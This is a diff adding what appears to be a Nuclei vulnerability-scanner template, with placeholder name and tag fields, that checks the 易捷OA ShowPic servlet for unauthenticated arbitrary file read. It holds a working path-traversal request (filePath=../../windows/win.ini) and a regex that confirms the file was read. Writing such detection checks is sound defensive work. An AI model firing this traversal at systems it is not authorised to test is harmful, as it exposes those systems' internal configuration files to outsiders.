@@ -1,0 +1,23 @@
+id: yijieoa-ShowPic-lfi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 易捷OA协同办公软件 ShowPic 接口处任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/140929116
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/ShowPic?filePath=../../windows/win.ini"
+      
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\[(font|extension|file)s\\]"
